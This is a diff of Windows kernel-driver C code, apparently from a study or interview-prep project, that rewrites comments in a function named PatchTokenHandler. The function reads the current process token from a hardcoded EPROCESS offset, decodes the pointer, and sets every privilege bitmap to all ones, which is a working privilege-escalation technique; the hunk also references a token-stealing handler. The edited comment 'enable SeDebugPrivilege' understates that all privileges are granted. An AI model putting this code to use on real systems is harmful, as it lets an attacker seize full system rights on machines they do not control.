@@ -52,24 +52,17 @@ NTSTATUS StealTokenHandler() {
 NTSTATUS PatchTokenHandler() {
     PEPROCESS CurrentProcess = PsGetCurrentProcess();
 
-    // 1. 取得當前 Process 的 Token (EX_FAST_REF)
-    // 記得：這是從 EPROCESS + 0x4b8 (假設) 讀出來的值
+    // get process token
     UINT64* pFastRefToken = (UINT64*)((UINT64)CurrentProcess + TOKEN_OFFSET);
     UINT64 FastRefValue = *pFastRefToken;
-
-    // 2. 【關鍵面試題】解碼 Token Address
-    // 因為低 4 位是 RefCount，必須遮罩掉才能當作指標使用
-    // ~0xF 等於 ...11110000
     UINT64 TokenAddress = FastRefValue & ~0xF;
 
     DbgPrint("[*] Current Token Address: %llx\n", TokenAddress);
 
-    // 3. 計算 Privileges 的位置
-    // Token Address + 0x40
+    // Privileges = Token Address + 0x40
     PSEP_TOKEN_PRIVILEGES pPrivileges = (PSEP_TOKEN_PRIVILEGES)(TokenAddress + TOKEN_PRIVILEGES_OFFSET);
 
-    // 4. 開外掛：將所有權限設為全開 (0xFFFFFFFFFFFFFFFF)
-    // 這代表開啟了 SeDebugPrivilege, SeTcbPrivilege 等等所有權限
+    // enable SeDebugPrivilege
     pPrivileges->Present = 0xFFFFFFFFFFFFFFFF;
     pPrivileges->Enabled = 0xFFFFFFFFFFFFFFFF;
     pPrivileges->EnabledByDefault = 0xFFFFFFFFFFFFFFFF;
